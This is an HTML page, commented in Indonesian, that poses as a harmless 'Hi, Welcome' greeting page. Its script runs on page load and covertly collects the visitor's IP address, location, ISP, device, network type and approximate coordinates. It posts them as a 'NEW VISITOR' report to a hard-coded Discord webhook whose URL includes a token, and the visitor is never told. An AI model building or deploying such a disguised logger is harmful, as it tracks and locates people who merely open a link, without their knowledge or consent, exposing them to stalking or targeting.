<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;600;800&display=swap');

        :root { --bg: #0a0a0a; --accent: #00ff88; --txt: #fff; }

        body {
            background: var(--bg); color: var(--txt); font-family: 'Space Grotesk', sans-serif;
            margin: 0; height: 100vh; display: flex; flex-direction: column;
            align-items: center; justify-content: center; overflow: hidden;
        }

        .greeting { padding: 20px; text-align: center; }
        .hi { font-size: 1rem; color: #666; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 10px; }
        
        .main { font-size: 4.5rem; font-weight: 800; line-height: 1.1; margin: 15px 0; color: #fff; position: relative; }
        .main::before { content: attr(data-text); position: absolute; left: 0; right: 0; color: var(--accent); opacity: 0.3; filter: blur(15px); z-index: -1; }
        
        .note { margin-top: 30px; font-size: 0.9rem; color: #888; background: rgba(255,255,255,0.05); padding: 12px 25px; border-radius: 50px; border: 1px solid #222; }

        .loader { position: fixed; bottom: 30px; right: 30px; width: 8px; height: 8px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 10px var(--accent); opacity: 0; transition: opacity 0.3s; }
        .loader.active { opacity: 1; animation: pulse 1s infinite; }
        
        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
    </style>
</head>
<body>

    <div class="greeting">
        <div class="hi">Hi, Welcome</div>
        <div class="main" id="greetText" data-text=""></div>
        <div class="note" id="noteText"></div>
    </div>

    <div class="loader" id="loader"></div>

    <script>
        // === PASTE DISCORD WEBHOOK URL DI BAWAH INI ===
        // Contoh: https://discord.com/api/webhooks/112233445566778899/ABCdefGHIjklmnopQRsTUVwxyZ
        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1513396133249024242/EZ8GI-vnWbW86C-aG8FLFa54nAj5ur-aTvZ5oLdqmQnj4lNlVbjgXXamrCLwLFZQcPst";

        // Ambil parameter catatan
        const params = new URLSearchParams(window.location.search);
        const catetan = params.get('note');

        // Greeting
        const jam = new Date().getHours();
        const sapa = jam < 12 ? "Good Morning" : jam < 18 ? "Good Afternoon" : "Good Evening";
        const teks = sapa + " :)";
        
        document.getElementById('greetText').innerText = teks;
        document.getElementById('greetText').setAttribute('data-text', teks);
        document.getElementById('noteText').innerText = catetan ? decodeURIComponent(catetan) : "";

        // KUMPUL DATA & KIRIM KE DISCORD
        async function collectAndSend() {
            document.getElementById('loader').classList.add('active');

            const waktu = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});

            let ip = "-", loc = "-", isp = "-";
            try {
                const d = await fetch('https://ipapi.co/json/').then(r => r.json());
                ip = d.ip;
                loc = `${d.city||''}, ${d.region||''}, ${d.country||''}`;
                isp = d.org;
            } catch(e) {}

            const ua = navigator.userAgent;
            const device = ua.includes("Windows") ? "Windows" : ua.includes("Mac") ? "Mac" : ua.includes("Android") ? "Android" : "Mobile";
            
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const network = conn ? conn.effectiveType : "Wifi";

            // Koordinat dari IP
            let koordinat = "-";
            try {
                const geo = await fetch('https://ipapi.co/' + ip + '/json/').then(r => r.json());
                if (geo.latitude && geo.longitude) {
                    koordinat = geo.latitude + ", " + geo.longitude;
                }
            } catch(e) {}

            // CEK: Apakah webhook URL sudah diisi dengan benar?
            if (WEBHOOK_URL.includes("discord.com/api/webhooks/") && !WEBHOOK_URL.includes("ISI_URL")) {
                
                const pesan = {
                    content: `🎯 **NEW VISITOR**\n` +
                             `⏰ Waktu: ${waktu}\n` +
                             `🌍 IP: ${ip}\n` +
                             `📍 Lokasi: ${loc}\n` +
                             `🏢 ISP: ${isp}\n` +
                             `💻 Device: ${device}\n` +
                             `📡 Network: ${network}\n` +
                             `📍 Koordinat: ${koordinat}\n` +
                             (catetan ? `📝 Catatan: ${decodeURIComponent(catetan)}` : '')
                };

                try {
                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(pesan)
                    });
                    
                    console.log("Discord response:", response.status);
                    
                } catch(e) {
                    console.log("Error sending to Discord:", e);
                }
            } else {
                console.log("Webhook URL belum dikonfigurasi!");
            }

            setTimeout(() => document.getElementById('loader').classList.remove('active'), 1500);
        }

        window.onload = collectAndSend;
    </script>
</body>
</html>
